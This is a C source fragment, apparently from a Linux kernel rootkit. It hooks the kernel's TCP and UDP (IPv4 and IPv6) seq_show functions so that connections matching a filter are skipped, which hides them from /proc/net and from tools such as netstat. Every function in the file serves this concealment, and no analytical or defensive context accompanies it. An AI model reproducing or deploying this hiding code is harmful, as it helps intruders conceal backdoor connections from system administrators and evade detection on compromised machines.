#include "../prototypes.h"
#include "filters.h"

// ===================================================================================================

int (*real_tcp4_seq_show)(struct seq_file *, void *) = NULL;
int ex_tcp4_seq_show(struct seq_file *seq, void *v) {
    int ret = real_tcp4_seq_show(seq, v);

    if (is_skip4_seq_show(v, tcp)) {
        return SEQ_SKIP;
    }

    return ret;
}

// ===================================================================================================

int (*real_tcp6_seq_show)(struct seq_file *, void *) = NULL;
int ex_tcp6_seq_show(struct seq_file *seq, void *v) {
    int ret = real_tcp6_seq_show(seq, v);

    if (is_skip6_seq_show(v, tcp)) {
        return SEQ_SKIP;
    }
    return ret;
}

// ===================================================================================================

int (*real_udp4_seq_show)(struct seq_file *, void *) = NULL;
int ex_udp4_seq_show(struct seq_file *seq, void *v)
{
    int ret = real_udp4_seq_show(seq, v);

    if (is_skip4_seq_show(v, udp)) {
        return SEQ_SKIP;
    }

    return ret;
}

// ===================================================================================================

int (*real_udp6_seq_show)(struct seq_file *, void *) = NULL;
int ex_udp6_seq_show(struct seq_file *seq, void *v) {
    int ret = real_udp6_seq_show(seq, v);

    if (is_skip6_seq_show(v, udp)) {
        return SEQ_SKIP;
    }

    return ret;
}